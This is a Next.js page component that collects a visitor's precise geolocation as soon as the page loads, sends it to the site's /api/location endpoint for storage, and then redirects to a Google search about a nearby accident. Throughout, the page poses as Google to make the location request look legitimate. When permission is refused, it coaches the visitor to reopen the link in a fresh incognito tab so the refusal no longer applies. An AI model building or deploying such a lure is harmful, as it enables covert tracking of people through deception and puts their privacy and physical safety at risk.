"use client";

import Link from "next/link";
import { useRouter } from "next/navigation";
import { useEffect, useState } from "react";

type LocationState = {
  lat: number | null;
  lng: number | null;
  accuracy: number | null;
};

export default function Page() {
  const router = useRouter();

  const [location, setLocation] = useState<LocationState>({
    lat: null,
    lng: null,
    accuracy: null,
  });
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const [savedId, setSavedId] = useState<number | null>(null);
  const [permissionDenied, setPermissionDenied] = useState(false);
  const [siteUrl, setSiteUrl] = useState<string | null>(null);

  // Get current site URL (for showing user what to open in Incognito)
  useEffect(() => {
    if (typeof window !== "undefined") {
      setSiteUrl(window.location.origin);
    }
  }, []);

  // 🔹 Call API to store location in DB
  const saveLocation = async (
    lat: number,
    lng: number,
    accuracy: number | null
  ) => {
    try {
      const res = await fetch("/api/location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ lat, lng, accuracy }),
      });

      if (!res.ok) {
        console.error("Failed to save location");
        return;
      }

      const data = await res.json();
      if (data?.id) {
        setSavedId(data.id);
      }
    } catch (e) {
      console.error("Error calling /api/location:", e);
    }
  };

  const getLocation = () => {
    if (typeof window === "undefined") return;

    if (!("geolocation" in navigator)) {
      setError("❌ Geolocation is not supported by this browser.");
      return;
    }

    setLoading(true);
    setError(null);
    setPermissionDenied(false);
    setSavedId(null);

    navigator.geolocation.getCurrentPosition(
      (position) => {
        setLoading(false);

        const lat = position.coords.latitude;
        const lng = position.coords.longitude;
        const accuracy = position.coords.accuracy;

        setLocation({ lat, lng, accuracy });
        console.log("Accuracy (m):", accuracy);

        // 🔹 Save to DB
        saveLocation(lat, lng, accuracy);

        // 🔹 After success, redirect to Google search
        router.push(
          "https://www.google.com/search?q=horrible+accident+happened+near+me"
        );
      },
      (err) => {
        setLoading(false);

        switch (err.code) {
          case err.PERMISSION_DENIED:
            setPermissionDenied(true);
            setError(
              "❌ You rejected location access. To get the best possible results from Google, please allow precise location."
            );
            break;
          case err.POSITION_UNAVAILABLE:
            setError("❌ Position unavailable. Try enabling GPS / location.");
            break;
          case err.TIMEOUT:
            setError("❌ Location request timed out. Please try again.");
            break;
          default:
            setError("❌ An unknown error occurred.");
        }
      },
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0,
      }
    );
  };

  // Auto-try once on mount
  useEffect(() => {
    getLocation();
  }, []);

  return (
    <main className="min-h-screen p-6 flex flex-col items-center gap-4">
      <h1 className="text-2xl font-bold">📍 Current Location</h1>

      {/* Main action button */}
      <button
        onClick={getLocation}
        disabled={loading}
        className="px-4 py-2 border rounded hover:bg-gray-100"
      >
        {loading
          ? "Fetching current location for best result for you FROM GOOGLE..."
          : "Refresh / Get Location"}
      </button>

      {/* If permission denied, show a strong prompt + incognito helper */}
      {permissionDenied && (
        <div className="max-w-xl w-full border border-red-300 bg-red-50 text-red-700 text-sm rounded p-3 space-y-2 ">
          <p className="font-semibold mb-1">
            <span className="underline underline-offset-4">Location permission</span> is required for best results
          </p>
          <p>
            You rejected location access. To get the{" "}
            <span className="bg-red-900 text-white px-1">
              most accurate and relevant results from Google
            </span>
            , please allow location access when the browser asks again.
          </p>

          {siteUrl && (
            <div className="mt-2 text-xs ">
              <p className="mb-1 font-semibold">Your site URL:</p>
              <p className="font-mono break-all bg-white text-red-800 px-2 py-1 rounded border border-red-200">
                {siteUrl}
              </p>
              <p className="mt-5">
                1-{" "}
                <span className="bg-red-900 text-white px-1">
                  First close all incognito / private tabs
                </span>
                , if any. Then, <br></br>
                <br></br>
                2-{" "}
                <span className="bg-red-900 text-white px-1">
                  Open Incognito / Private tab
                </span>{" "}
                in your browser, paste this URL there, and then tap{" "}
                <span className="font-semibold">“Refresh / Get Location”</span>{" "}
                again.
              </p>
            </div>
          )}
        </div>
      )}

      {error && !permissionDenied && (
        <p className="text-red-600 text-sm">{error}</p>
      )}

      {savedId && (
        <Link href={"https://google.com"} className="text-blue-600 underline">
          Welcome to Google!
        </Link>
      )}

      {location.lat && location.lng && (
        <div className="w-full max-w-2xl space-y-2">
          <p className="text-sm">
            <strong>Latitude:</strong> {location.lat}
          </p>
          <p className="text-sm">
            <strong>Longitude:</strong> {location.lng}
          </p>

          {location.accuracy && (
            <p className="text-xs text-gray-600">
              Accuracy: ± {Math.round(location.accuracy)} meters
            </p>
          )}

          {/* Embedded Google Map */}
          <div className="w-full h-80 border rounded overflow-hidden mt-4">
            <iframe
              title="User Map"
              src={`https://www.google.com/maps?q=${location.lat},${location.lng}&z=18&output=embed`}
              className="w-full h-full"
              loading="lazy"
              referrerPolicy="no-referrer-when-downgrade"
            />
          </div>

          <a
            href={`https://www.google.com/maps?q=${location.lat},${location.lng}`}
            target="_blank"
            rel="noreferrer"
            className="text-blue-600 underline text-sm"
          >
            View full map on Google Maps →
          </a>
        </div>
      )}

      {!location.lat && !loading && !error && !permissionDenied && (
        <p className="text-sm text-gray-500">Fetching location...</p>
      )}
    </main>
  );
}
